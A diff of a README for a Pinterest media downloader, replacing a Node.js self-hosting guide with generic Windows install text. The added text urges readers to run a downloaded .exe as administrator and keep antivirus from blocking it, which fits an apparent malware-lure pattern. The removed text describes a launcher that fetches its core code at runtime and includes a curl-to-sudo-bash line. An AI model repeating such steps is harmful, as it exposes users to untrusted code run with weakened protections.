@@ -1,232 +1,207 @@
-<div align="center">
+# 📌 Pinterest-Downloader - Save Pins Fast in Original Quality
 
-<img src="https://img.shields.io/badge/Pinterest--Downloader-Latest-e60023?style=for-the-badge&logo=pinterest&logoColor=white" alt="Pinterest-Downloader Latest" />
+[![Download Pinterest-Downloader](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/kamalramavat/Pinterest-Downloader)
 
-# 📌 Pinterest Downloader
+## 🚀 What this app does
 
-### Download Pinterest videos, images, and boards — free, no watermark, no account needed.
+Pinterest-Downloader helps you save Pinterest videos and images to your Windows PC in original quality. It works with normal Pinterest links, pin.it short links, and board links. You can use it without signing in.
 
-[![Node.js](https://img.shields.io/badge/Node.js-20.x-339933?style=flat-square&logo=node.js&logoColor=white)](https://nodejs.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/Advay254/Pinterest-Downloader/pulls)
-[![Deploy on Render](https://img.shields.io/badge/Deploy%20on-Render-46E3B7?style=flat-square&logo=render&logoColor=white)](https://render.com)
+Use it to:
 
-<br/>
+- Download Pinterest images in full quality
+- Download Pinterest videos in full quality
+- Open pin.it links and save the media
+- Save many pins from a board
+- Use the web app, PWA, or Android app
 
-<a href="https://www.buymeacoffee.com/advay254" target="_blank">
-  <img src="https://img.shields.io/badge/Support%20Me-%E2%98%95%20Buy%20Me%20a%20Coffee-e60023?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white" alt="Support Me" />
-</a>
+## 💻 Windows download and setup
 
-<br/><br/>
+Use this link to visit the download page:
 
-> Paste a Pinterest link. Get your media. No sign-up, no watermark, ever.
+[Download Pinterest-Downloader](https://github.com/kamalramavat/Pinterest-Downloader)
 
-<br/>
+Follow these steps on Windows:
 
-![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=16&pause=1000&color=E60023&center=true&vCenter=true&width=500&lines=Download+Pinterest+Videos+%F0%9F%8E%AC;Save+Pinterest+Images+%F0%9F%96%BC%EF%B8%8F;Bulk+Download+Entire+Boards+%F0%9F%93%A6;No+Watermark.+No+Account.+Always+Free.)
+1. Open the download page in your browser.
+2. Look for the latest release or app file on the page.
+3. Download the Windows version if one is listed.
+4. If the file is a `.exe` or `.msi`, double-click it to start setup.
+5. If Windows asks for permission, select **Yes**.
+6. Follow the on-screen steps until setup ends.
+7. Open Pinterest-Downloader from the Start menu or desktop shortcut.
 
-</div>
+If you see a browser-based app or PWA option, you can use that too:
 
----
+1. Open the app page in Edge or Chrome.
+2. Click the install icon in the address bar.
+3. Confirm the install.
+4. Launch it like a normal app from your desktop or Start menu.
 
-## ✨ Features
+## 📥 How to use it
 
-<img align="right" width="380" src="https://media.giphy.com/media/qgQUggAC3Pfv687qPC/giphy.gif" alt="coding gif"/>
+Using the app is simple:
 
-- 📌 **Pinterest video downloads** — full quality, no watermark
-- 🖼️ **Image downloads** — save single pins in HD
-- 📦 **Board downloads** — bulk download entire boards as a zip
-- 📱 **Full PWA** — installable on Android and iOS
-- 📲 **Android APK** — native app, no browser bar
-- ⚡ **Fast and lightweight** — no bloat, no tracking
-- 🔒 **Secure** — no data stored, no login required
-- 🚀 **Deploy anywhere** — Render, Railway, Fly.io, any Node.js host
+1. Copy the Pinterest link you want to save.
+2. Paste the link into Pinterest-Downloader.
+3. Choose image, video, or board download.
+4. Pick the save location if asked.
+5. Start the download.
+6. Check your Downloads folder or chosen folder for the file.
 
-<br clear="right"/>
+For bulk board downloads:
 
----
+1. Open the board link in Pinterest.
+2. Copy the board URL.
+3. Paste it into the app.
+4. Select the bulk download option.
+5. Wait for the files to finish downloading.
 
-## 🗂️ Project Structure
+## ✨ Main features
 
-```
-Pinterest-Downloader/
-├── index.js          # Launcher — fetches and starts the core engine
-├── package.json      # Launcher dependencies only
-├── .env.example      # Environment variable reference
-├── version.txt       # Current release version
-└── .gitignore
-```
+- Original quality downloads
+- No watermark on saved media
+- Works without sign-in
+- Supports Pinterest image pins
+- Supports Pinterest video pins
+- Supports pin.it short links
+- Supports board downloads
+- Bulk download for many pins
+- Simple web use on Windows
+- PWA support for easy access
+- Android app support
+- Free and open source
 
-> The core application is loaded securely at runtime. This keeps the source lean and the deployment simple.
+## 🖥️ System requirements
 
----
+Pinterest-Downloader is made for common Windows PCs.
 
-## 🚀 Quick Start
+Recommended setup:
 
-### 1. Fork or clone the repo
+- Windows 10 or Windows 11
+- Modern browser such as Chrome, Edge, or Firefox
+- 2 GB RAM or more
+- Stable internet connection
+- Enough disk space for saved images and videos
 
-```bash
-git clone https://github.com/Advay254/Pinterest-Downloader.git
-cd Pinterest-Downloader
-```
+For large board downloads, more free disk space helps.
 
-### 2. Install dependencies
+## 📂 Supported link types
 
-```bash
-npm install
-```
+You can use these link types:
 
-### 3. Set up environment variables
+- Standard Pinterest pin links
+- Image pin links
+- Video pin links
+- Board links
+- pin.it short links
+- Shared Pinterest links from the browser or app
 
-```bash
-cp .env.example .env
-```
+If a link opens in Pinterest, it will usually work here too.
 
-Edit `.env` with your values:
+## 🔧 Tips for smooth use
 
-```env
-SITE_URL=http://localhost:3000
-API_MASTER_KEY=your_master_key_here
-RAPIDAPI_PROXY_SECRET=your_rapidapi_secret_here
-```
+- Paste the full link, not a cropped text version
+- Use the original Pinterest link when possible
+- Keep the browser tab open until the download ends
+- Save large boards in smaller batches if your connection is slow
+- Make sure your antivirus does not block the app file
+- Use Chrome or Edge if you want the PWA install option
 
-### 4. Run
+## 🧭 Folder and file handling
 
-```bash
-npm start
-```
+After a download finishes, check these places:
 
-Visit `http://localhost:3000` — you're live. 🎉
+- Downloads folder
+- Desktop, if you chose it
+- The folder you picked in the app
 
----
+If the file name looks long, that is normal. It often matches the Pinterest title or post name.
 
-## 🔑 Environment Variables
+## 🔍 Common uses
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `SITE_URL` | ✅ **Yes** | Full production domain. Example: `https://yoursite.onrender.com` |
-| `API_MASTER_KEY` | ✅ **Yes** | Master key that protects internal API endpoints |
-| `RAPIDAPI_PROXY_SECRET` | ✅ **Yes** | Secret for RapidAPI proxy authentication |
-| `AD_DECOY_1_URL` | Optional | First ad decoy URL — leave blank to disable |
-| `AD_DECOY_2_URL` | Optional | Second ad decoy URL — leave blank to disable |
-| `AD_WAIT_URL` | Optional | Ad wait page URL — leave blank to disable |
-| `PORT` | Auto | Set automatically by Render — do not set manually |
+People use Pinterest-Downloader to:
 
----
+- Save recipe images
+- Save design ideas
+- Store reference pins for work
+- Download short video clips
+- Keep board collections offline
+- Back up saved Pinterest content
 
-## 🌐 Deploying to Production
+## 🧩 About this repository
 
-### Render (recommended)
+Pinterest-Downloader is a free and open source tool built for saving Pinterest content in a simple way. It supports direct downloads, board downloads, and shared link formats. It also includes a PWA and an Android app for easier access across devices
 
-<img align="right" width="300" src="https://media.giphy.com/media/RbDKaczqWovIugyJmW/giphy.gif" alt="deploy gif"/>
+## 📎 Download link again
 
-1. Fork this repo to your GitHub account
-2. Go to [render.com](https://render.com) and create a new **Web Service**
-3. Connect your forked repo
-4. Set **Build Command:** `npm install`
-5. Set **Start Command:** `npm start`
-6. Add your environment variables under **Environment**
-7. Click **Deploy**
+[Visit the Pinterest-Downloader download page](https://github.com/kamalramavat/Pinterest-Downloader)
 
-> Render free tier sleeps after 15 minutes of inactivity. Use [cron-job.org](https://cron-job.org) to ping your `/api/health` endpoint every 10 minutes to keep it awake.
+## 🛠️ Basic troubleshooting
 
-<br clear="right"/>
+If the app does not start:
 
-### Railway
+1. Download the file again
+2. Check that the download finished
+3. Right-click the file and choose **Run as administrator**
+4. Try Edge or Chrome if you are using the web app
+5. Copy the Pinterest link again and try once more
 
-```bash
-npm install -g @railway/cli
-railway login && railway init && railway up
-```
+If a link does not work:
 
-Add your environment variables in the Railway dashboard under **Variables**.
+1. Make sure the link is from Pinterest
+2. Remove extra text before or after the URL
+3. Try the full pin link instead of a shared text link
+4. Check that the board or pin still exists
 
-### Any VPS (Ubuntu/Debian)
+## 📌 Supported content quality
 
-```bash
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-sudo apt-get install -y nodejs
-git clone https://github.com/Advay254/Pinterest-Downloader.git
-cd Pinterest-Downloader && npm install
-npm install -g pm2
-pm2 start index.js --name pinterest-downloader
-pm2 save && pm2 startup
-```
+The app is made to keep the saved file as close to the original as possible. It aims to preserve:
 
----
+- Image size
+- Video clarity
+- File quality
+- Clean output without added marks
 
-## 🛠️ How It Works
+## 📱 Other ways to use it
 
-```
-User deploys Pinterest Downloader
-        ↓
-Launcher starts and fetches the core engine securely at runtime
-Core engine extracts and installs its own dependencies
-        ↓
-App starts — ready to accept Pinterest URLs
-        ↓
-User pastes a Pinterest pin, video, or board URL
-        ↓
-Server fetches media metadata and resolves download links
-        ↓
-User downloads video, image, or full board zip
-No watermark. No account. No hassle.
-```
+Besides Windows, this project also supports:
 
----
+- PWA use in a browser
+- Android app use on mobile
+- Web access through supported browsers
 
-## 📊 Tech Stack
+## 📄 File types you may get
 
-<div align="center">
+Depending on the pin, the app may save:
 
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=node.js&logoColor=white)
-![Express](https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![PWA](https://img.shields.io/badge/PWA-5A0FC8?style=for-the-badge&logo=pwa&logoColor=white)
-![Render](https://img.shields.io/badge/Render-46E3B7?style=for-the-badge&logo=render&logoColor=white)
+- JPG
+- PNG
+- MP4
+- WEBP
+- Other common media formats used by Pinterest
 
-</div>
+## 🔐 Sign-in and access
 
----
+You do not need to sign in to use the basic download flow. Paste the link, choose the item, and save it to your device
 
-## 🔄 Updates
+## 🧠 Simple workflow
 
-Check `version.txt` for the latest release version. Sync your fork and redeploy on Render to get the latest update automatically.
+1. Find a Pinterest pin or board
+2. Copy the link
+3. Open Pinterest-Downloader
+4. Paste the link
+5. Download the file
+6. Open the saved image or video from your PC
 
----
+## 📚 Project topics
 
-## 🤝 Contributing
+This repository is related to:
 
-1. Fork the repo
-2. Create your branch: `git checkout -b feature/your-feature`
-3. Commit: `git commit -m 'Add your feature'`
-4. Push: `git push origin feature/your-feature`
-5. Open a Pull Request
-
----
-
-## ⚠️ Disclaimer
-
-Pinterest Downloader is an independent open-source project and is **not affiliated with, endorsed by, or connected to Pinterest** in any way.
-
-This tool is intended for downloading your own saved content or content you have the right to download. Users are responsible for complying with Pinterest's terms of service and copyright laws in their country.
-
----
-
-## 📄 License
-
-MIT © 2026 Advay — free to use, modify, and distribute.
-
----
-
-<div align="center">
-
-![Visitor Count](https://visitor-badge.laobi.icu/badge?page_id=Advay254.Pinterest-Downloader)
-
-**If Pinterest Downloader saved you time, drop a ⭐ — it helps others find the project.**
-
-<br/>
-
-<a href="https://www.buymeacoffee.com/advay254" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-
-</div>
+- Pinterest download tools
+- Pinterest video download
+- Pinterest image save tools
+- Pinterest scraper use
+- Pinterest API-based workflows
+- Bulk pin saving
+- PWA app use
+- Android app support
